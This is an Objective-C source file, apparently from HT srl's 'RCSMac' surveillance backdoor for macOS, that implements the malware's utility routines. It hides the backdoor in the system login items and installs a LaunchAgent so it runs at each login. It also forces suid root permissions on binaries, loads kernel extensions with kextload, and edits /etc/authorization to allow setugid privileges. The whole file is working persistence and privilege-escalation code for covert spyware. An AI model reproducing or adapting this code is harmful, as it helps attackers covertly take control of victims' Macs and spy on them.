/*
 * RCSMac - RCSMUtils
 *
 * Created by Alfredo 'revenge' Pesoli on 27/03/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <sys/stat.h>

#import "RCSMUtils.h"
#import "RCSMCommon.h"

#import "RCSMDebug.h"
#import "RCSMLogger.h"


static RCSMUtils *sharedUtils = nil;

@implementation RCSMUtils

@synthesize mBackdoorPath;
@synthesize mKext32Path;
@synthesize mKext64Path;
@synthesize mSLIPlistPath;
@synthesize mServiceLoaderPath;
@synthesize mExecFlag;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSMUtils *)sharedInstance
{
@synchronized(self)
  {
    if (sharedUtils == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedUtils;
}

+ (id)allocWithZone: (NSZone *)aZone
{
@synchronized(self)
  {
    if (sharedUtils == nil)
      {
        sharedUtils = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedUtils;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
@synchronized(myClass)
  {
    if (sharedUtils != nil)
      {
        self = [super init];
        
        if (self != nil)
          {
            sharedUtils = self;
          }
      }
  }
  
  return sharedUtils;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark General purpose routines
#pragma mark -

- (void)executeTask: (NSString *)anAppPath
      withArguments: (NSArray *)arguments
       waitUntilEnd: (BOOL)waitForExecution
{
  NSTask *task = [[NSTask alloc] init];
  [task setLaunchPath: anAppPath];
  
  if (arguments != nil)
    [task setArguments: arguments];
  
  NSPipe *_pipe = [NSPipe pipe];
  [task setStandardOutput: _pipe];
  [task setStandardError:  _pipe];
  
#ifdef DEBUG_UTILS
  infoLog(@"Executing %@", anAppPath);
#endif
  
  [task launch];
  
#ifdef DEBUG_UTILS
  infoLog(@"Executed %@", anAppPath);
#endif
  
  if (waitForExecution == YES)
    {
#ifdef DEBUG_UTILS
      infoLog(@"Waiting until task exit");
#endif
      [task waitUntilExit];
    }
  
#ifdef DEBUG_UTILS
  infoLog(@"Task exited");
#endif
  
  [task release];
}

- (BOOL)addBackdoorToSLIPlist
{  
  NSMutableDictionary *dicts = [self openSLIPlist];
  NSArray *keys = [dicts allKeys];
  
  if (dicts)
    {
      for (NSString *key in keys)
        {
          if ([key isEqualToString: @"AutoLaunchedApplicationDictionary"])
            {
              NSMutableArray *value = (NSMutableArray *)[dicts objectForKey: key];
              
              if (value != nil)
                {
#ifdef DEBUG_UTILS
                  NSLog(@"%s - %@", __FUNCTION__, value);
                  NSLog(@"%s - %@", __FUNCTION__, [value class]);
#endif
                  
                  NSMutableDictionary *entry = [NSMutableDictionary new];
                  [entry setObject: [NSNumber numberWithBool: TRUE] forKey: @"Hide"];
                  [entry setObject: [[NSBundle mainBundle] bundlePath] forKey: @"Path"];
                  
                  [value addObject: entry];
                  
                  [entry release];
                }
            }
        }
    }
  
  return [self saveSLIPlist: dicts
                     atPath: @"com.apple.SystemLoginItems.plist"];
}

- (BOOL)removeBackdoorFromSLIPlist
{
  //
  // For now we just move back the backup that we made previously
  // The best way would be just by removing our own entry from the most
  // up to date SLI plist /Library/Preferences/com.apple.SystemLoginItems.plist
  //
  if ([[NSFileManager defaultManager] removeItemAtPath: mSLIPlistPath
                                                 error: nil] == YES)
    {
      if ([[NSFileManager defaultManager] fileExistsAtPath: @"com.apple.SystemLoginItems.plist_bak"])
        {
          return [[NSFileManager defaultManager] copyItemAtPath: @"com.apple.SystemLoginItems.plist_bak"
                                                         toPath: mSLIPlistPath
                                                          error: nil];
        }
      else
        {
          return YES;
        }
    }
  
  return NO;
}

- (BOOL)searchSLIPlistForKey: (NSString *)aKey;
{
  NSMutableDictionary *dicts = [self openSLIPlist];
  NSArray *keys = [dicts allKeys];
  
  if (dicts)
    {
      for (NSString *key in keys)
        {
          if ([key isEqualToString: @"AutoLaunchedApplicationDictionary"])
            {
              NSString *value = (NSString *)[dicts valueForKey: key];
              id searchResult = [value valueForKey: @"Path"];
              
              NSEnumerator *enumerator = [searchResult objectEnumerator];
              id searchResObject;
              
              while ((searchResObject = [enumerator nextObject]) != nil )
                {
                  if ([searchResObject isEqualToString: aKey])
                    return YES;
                }
            }
        }
    }
  
  return NO;
}

- (BOOL)saveSLIPlist: (id)anObject atPath: (NSString *)aPath
{
#ifdef DEBUG_UTILS
  NSLog(@"path: %@", aPath);
#endif
  
  BOOL success = [anObject writeToFile: aPath
                            atomically: YES];
  
  if (success == NO)
    {
#ifdef DEBUG_UTILS
      NSLog(@"An error occured while saving the plist file");
#endif
      
      return NO;
    }
  else
    {
#ifdef DEBUG_UTILS
      NSLog(@"Plist file saved: correctly");
#endif
    }
  
  //
  // Force owner since we can't remove that file if not owned by us
  // with removeItemAtPath:error (e.g. backdoor upgrade)
  //
  NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
                        NSHomeDirectory(),
                        BACKDOOR_DAEMON_PLIST];
  NSString *userAndGroup = [NSString stringWithFormat: @"%@:staff", NSUserName()];
  NSArray *_tempArguments = [[NSArray alloc] initWithObjects:
                             userAndGroup,
                             ourPlist,
                             nil];
  
  [gUtil executeTask: @"/usr/sbin/chown"
       withArguments: _tempArguments
        waitUntilEnd: YES];
  
  [_tempArguments release];
  return YES;
}

- (BOOL)createSLIPlistWithBackdoor
{
  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity:1];
  NSDictionary *innerDict;
  NSMutableArray *innerArray = [NSMutableArray new];
  NSString *appKey = @"AutoLaunchedApplicationDictionary";
  
  NSArray *tempArray = [NSArray arrayWithObjects: @"1",
                                                  [[NSBundle mainBundle] bundlePath],
                                                  nil];
  NSArray *tempKeys  = [NSArray arrayWithObjects: @"Hide",
                                                  @"Path",
                                                  nil];
  
  innerDict = [NSDictionary dictionaryWithObjects: tempArray
                                          forKeys: tempKeys];
  [innerArray addObject: innerDict];
  [rootObj setObject: innerArray
              forKey: appKey];
  
  NSString *err;
  NSData *binData = [NSPropertyListSerialization dataFromPropertyList: rootObj
                                                               format: NSPropertyListXMLFormat_v1_0
                                                     errorDescription: &err];
  
  [innerArray release];
  if (binData)
    {
      return [self saveSLIPlist: binData
                         atPath: [self mSLIPlistPath]];
    }
  else
    {
#ifdef DEBUG_UTILS
      NSLog(@"[createSLIPlist] An error occurred");
#endif
      
      [err release];
    }
  
  return NO;
}

- (BOOL)createLaunchAgentPlist: (NSString *)aLabel
                     forBinary: (NSString *)aBinary
{
  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 1];
  NSDictionary *innerDict;
  NSString *userHome;
  
  if (getuid() == 0)
    {
      //
      // if we've been correctly executed from /Users/<user>/Library/Preferences
      // we can safely obtain the user home from our current path
      // if not just use NSHomeDirectory()
      //
      if ([[[NSBundle mainBundle] bundlePath]
          rangeOfString: @"/Library/Preferences"].location != NSNotFound
          && [[[NSBundle mainBundle] bundlePath]
          rangeOfString: @"/Users/"].location != NSNotFound)
        {
          userHome = [NSString stringWithString:
            [[[[[NSBundle mainBundle] bundlePath]
            stringByDeletingLastPathComponent]
            stringByDeletingLastPathComponent]
            stringByDeletingLastPathComponent]];
        }
      else
        {
#ifdef DEBUG_UTILS
          errorLog(@"Error, run the backdoor from the correct path");
#endif

          return NO;
        }
    }
  else
    {
      userHome = NSHomeDirectory(); 
    }

  NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
                        userHome,
                        BACKDOOR_DAEMON_PLIST];
  if ([[NSFileManager defaultManager] fileExistsAtPath: ourPlist])
    {
#ifdef DEBUG_UTILS
      warnLog(@"Launch Agents file exists, recreating");
#endif
      [[NSFileManager defaultManager] removeItemAtPath: ourPlist
                                                 error: nil];
    }

  NSString *launchAgentsPath = [NSString stringWithFormat: @"%@/Library/LaunchAgents",
           userHome];

  if ([[NSFileManager defaultManager] fileExistsAtPath: launchAgentsPath] == NO)
    {
#ifdef DEBUG_UTILS
      warnLog(@"LaunchAgents path doesn't exists yet, creating");
#endif

      if (mkdir([launchAgentsPath UTF8String], 0755) == -1)
        {
#ifdef DEBUG_UTILS
          errorLog(@"Error mkdir LaunchAgents (%d)", errno);
#endif
          return NO;
        }
    }
  
  NSString *backdoorPath = [NSString stringWithFormat: @"%@/%@", mBackdoorPath, aBinary];
  NSString *errorLog = [NSString stringWithFormat: @"%@/ji33", mBackdoorPath];
  NSString *outLog   = [NSString stringWithFormat: @"%@/ji34", mBackdoorPath];

  innerDict = [[NSDictionary alloc] initWithObjectsAndKeys:
               aLabel, @"Label",
               @"Aqua", @"LimitLoadToSessionType",
               [NSNumber numberWithBool: FALSE], @"OnDemand",
               [NSArray arrayWithObjects: backdoorPath, nil], @"ProgramArguments",
               errorLog, @"StandardErrorPath",
               outLog, @"StandardOutPath",
               nil];
               //[NSNumber numberWithBool: TRUE], @"RunAtLoad", nil];
  
  [rootObj addEntriesFromDictionary: innerDict];
  [innerDict release];
  
  return [self saveSLIPlist: rootObj
                     atPath: ourPlist];
}

- (BOOL)isBackdoorPresentInSLI: (NSString *)aKey
{
  return [self searchSLIPlistForKey: aKey];
}

- (id)openSLIPlist
{
  NSData *binData = [NSData dataWithContentsOfFile: mSLIPlistPath];
  NSString *error;
  
  if (!binData)
    {
#ifdef DEBUG_UTILS
      NSLog(@"[openSLIPlist] Error while opening %@", mSLIPlistPath);
#endif
      
      return 0;
    }
  
  NSPropertyListFormat format;
  NSMutableDictionary *dicts = (NSMutableDictionary *)
                      [NSPropertyListSerialization propertyListFromData: binData
                                                       mutabilityOption: NSPropertyListMutableContainersAndLeaves
                                                                 format: &format
                                                       errorDescription: &error];
  
  if (dicts)
    {
      return dicts;
    }

  return 0;
}

- (BOOL)makeSuidBinary: (NSString *)aBinary
{
  BOOL success;
  
  //
  // Forcing suid permission on start, just to be sure
  //
  if (gOSMajor == 10 && (gOSMinor == 5 || gOSMinor == 6))
    {
      u_long permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
      NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
      NSValue *owner      = [NSNumber numberWithInt: 0];
      
      NSDictionary *tempDictionary = [NSDictionary dictionaryWithObjectsAndKeys:
                                      permission,
                                      NSFilePosixPermissions,
                                      owner,
                                      NSFileOwnerAccountID,
                                      nil];
      
      success = [[NSFileManager defaultManager] setAttributes: tempDictionary
                                                 ofItemAtPath: aBinary
                                                        error: nil];
      
      //[self disableSetugidAuth];
    }
  else
    {
      success = NO;
    }
  
  return success;
}

- (BOOL)dropExecFlag
{
  BOOL success;
  
  //
  // Create the empty existence flag file
  //
  success = [@"" writeToFile: [self mExecFlag]
                  atomically: NO
                    encoding: NSUnicodeStringEncoding
                       error: nil];
  
  if (success == YES)
    {
#ifdef DEBUG_UTILS
      NSLog(@"Existence flag created successfully"); 
#endif
      
      return YES;
    }
  else
    {
#ifdef DEBUG_UTILS
      NSLog(@"Error while creating the existence flag");
#endif
      
      return NO;
    }
}

- (BOOL)loadKextFor64bit: (BOOL)is64bit
{
  if (is64bitKernel())
    {
#ifdef DEBUG_UTILS
      NSLog(@"Loading KEXT64 @ %@", mKext64Path);
#endif
      if ([[NSFileManager defaultManager] fileExistsAtPath: mKext64Path])
        {
#ifdef DEBUG_UTILS
          NSLog(@"KEXT64 found");
#endif
          NSArray *arguments = [NSArray arrayWithObjects: @"-R",
                                                          @"744",
                                                          mKext64Path,
                                                          nil];
          [self executeTask: @"/bin/chmod"
              withArguments: arguments
               waitUntilEnd: YES];

          if (getuid() == 0 || geteuid() == 0)
            {
              arguments = [NSArray arrayWithObjects: @"-R",
                                                     @"root:wheel",
                                                     mKext64Path,
                                                     nil];
              [self executeTask: @"/usr/sbin/chown"
                  withArguments: arguments
                   waitUntilEnd: YES];

              arguments = [NSArray arrayWithObjects: mKext64Path, nil];

              [self executeTask: @"/sbin/kextload"
                  withArguments: arguments
                   waitUntilEnd: YES];
            }
        }
      else
        {
#ifdef DEBUG_UTILS
          NSLog(@"KEXT64 not found");
#endif

          return NO;
        }
    }
  else
    {
#ifdef DEBUG_UTILS
      //NSLog(@"Loading KEXT32 @ %@", mKextPath);
#endif
      if ([[NSFileManager defaultManager] fileExistsAtPath: mKext32Path])
        {
#ifdef DEBUG_UTILS
          NSLog(@"KEXT32 found");
#endif
          NSArray *arguments = [NSArray arrayWithObjects: @"-R",
                                                          @"744",
                                                          mKext32Path,
                                                          nil];
          [self executeTask: @"/bin/chmod"
              withArguments: arguments
               waitUntilEnd: YES];

          if (getuid() == 0 || geteuid() == 0)
            {
              arguments = [NSArray arrayWithObjects: @"-R",
                                                     @"root:wheel",
                                                     mKext32Path,
                                                     nil];
              [self executeTask: @"/usr/sbin/chown"
                  withArguments: arguments
                   waitUntilEnd: YES];

              arguments = [NSArray arrayWithObjects: mKext32Path, nil];

              [self executeTask: @"/sbin/kextload"
                  withArguments: arguments
                   waitUntilEnd: YES];
            }
        }
      else
        {
#ifdef DEBUG_UTILS
          NSLog(@"KEXT32 not found");
#endif

          return NO;
        }
    }
  
  return YES;
}

- (BOOL)unloadKext
{
  if (is64bitKernel())
    {
#ifdef DEBUG_UTILS
      NSLog(@"Unloading our KEXT64 @ %@", mKext64Path);
#endif

      if ([[NSFileManager defaultManager] fileExistsAtPath: mKext64Path])
        {
#ifdef DEBUG_UTILS
          NSLog(@"KEXT64 found");
#endif

          if (getuid() == 0 || geteuid() == 0)
            {
              NSArray *arguments = [NSArray arrayWithObjects: mKext64Path, nil];

              [self executeTask: @"/sbin/kextunload"
                  withArguments: arguments
                   waitUntilEnd: YES];
            }
        }
      else
        {
#ifdef DEBUG_UTILS
          NSLog(@"KEXT64 not found");
#endif
          return NO;
        }
    }
  else
    {
#ifdef DEBUG_UTILS
      NSLog(@"Unloading our KEXT32 @ %@", mKext32Path);
#endif

      if ([[NSFileManager defaultManager] fileExistsAtPath: mKext32Path])
        {
#ifdef DEBUG_UTILS
          NSLog(@"KEXT32 found");
#endif

          if (getuid() == 0 || geteuid() == 0)
            {
              NSArray *arguments = [NSArray arrayWithObjects: mKext32Path, nil];

              [self executeTask: @"/sbin/kextunload"
                  withArguments: arguments
                   waitUntilEnd: YES];
            }
        }
      else
        {
#ifdef DEBUG_UTILS
          NSLog(@"KEXT not found");
#endif
          return NO;
        }
    }

  return YES;
}

- (BOOL)enableSetugidAuth
{
  NSData *binData = [NSData dataWithContentsOfFile: @"/etc/authorization"];
  
  if (!binData)
    {
#ifdef DEBUG_UTILS
      errorLog(@"Error while opening auth file");
#endif
    
      return NO;
    }
  
  NSPropertyListFormat format;
  NSMutableDictionary *rootObject = nil;
  
#ifdef MAC_OS_X_VERSION_10_6
  NSError *error;
  rootObject = (NSMutableDictionary *)
    [NSPropertyListSerialization propertyListWithData: binData
                                              options: NSPropertyListMutableContainersAndLeaves
                                               format: &format
                                                error: &error];
#else
  NSString *error;
  rootObject = (NSMutableDictionary *)
    [NSPropertyListSerialization propertyListFromData: binData
                                     mutabilityOption: NSPropertyListMutableContainersAndLeaves
                                               format: &format
                                     errorDescription: &error];
#endif
  
  NSArray *rootKeys = [rootObject allKeys];
  
  if (rootObject)
    {
      for (NSString *key in rootKeys)
        {
          if ([key isEqualToString: @"rights"])
            {
              NSMutableDictionary *dictsArray = (NSMutableDictionary *)[rootObject objectForKey: key];
              
              if (dictsArray != nil)
                {
                  /*
                   <key>system.privilege.setugid_appkit</key> 
                     <dict> 
                     <key>class</key> 
                     <string>allow</string> 
                     <key>comment</key> 
                     <string>Comment here</string> 
                     </dict>
                  */
                  
                  NSString *entryKey = @"system.privilege.setugid_appkit";
                  id object = [dictsArray objectForKey: entryKey];
                  
                  if (object == nil)
                    {
                      NSArray *keys = [NSArray arrayWithObjects: @"class",
                                                                 @"comment",
                                                                 nil];
                      
                      NSArray *objects = [NSArray arrayWithObjects: @"allow",
                                                                    @"a",
                                                                    nil];
                      
                      NSDictionary *innerDict = [NSDictionary dictionaryWithObjects: objects
                                                                            forKeys: keys];
                      NSDictionary *outerDict = [NSDictionary dictionaryWithObject: innerDict
                                                                            forKey: entryKey];
                      [dictsArray addEntriesFromDictionary: outerDict];
                    }
                }
            }
        }
    }
  
  return [self saveSLIPlist: rootObject
                     atPath: @"/etc/authorization"];
}

- (BOOL)disableSetugidAuth
{
  NSData *binData = [NSData dataWithContentsOfFile: @"/etc/authorization"];
  
  if (!binData)
    {
#ifdef DEBUG_UTILS
      errorLog(@"Error while opening auth file");
#endif
    
      return NO;
    }
  
  NSPropertyListFormat format;
  NSMutableDictionary *rootObject = nil;
  
#ifdef MAC_OS_X_VERSION_10_6
  NSError *error;
  rootObject = (NSMutableDictionary *)
    [NSPropertyListSerialization propertyListWithData: binData
                                              options: NSPropertyListMutableContainersAndLeaves
                                               format: &format
                                                error: &error];
#else
  NSString *error;
  rootObject = (NSMutableDictionary *)
    [NSPropertyListSerialization propertyListFromData: binData
                                     mutabilityOption: NSPropertyListMutableContainersAndLeaves
                                               format: &format
                                     errorDescription: &error];
#endif
  
  NSArray *rootKeys = [rootObject allKeys];
  
  if (rootObject)
    {
      for (NSString *key in rootKeys)
        {
          if ([key isEqualToString: @"rights"])
            {
              NSMutableDictionary *dictsArray = (NSMutableDictionary *)[rootObject objectForKey: key];
              
              if (dictsArray != nil)
                {
                  NSString *entryKey = @"system.privilege.setugid_appkit";
                  [dictsArray removeObjectForKey: entryKey];
                }
            }
        }
    }
  
  return [self saveSLIPlist: rootObject
                     atPath: @"/etc/authorization"];  
}

- (BOOL)isLeopard
{
  if (gOSMajor == 10 && gOSMinor == 5)
    return YES;
  
  return NO;
}

- (BOOL)isLion
{
  if (gOSMajor == 10 && gOSMinor == 7)
    return YES;
  
  return NO;
}

@end
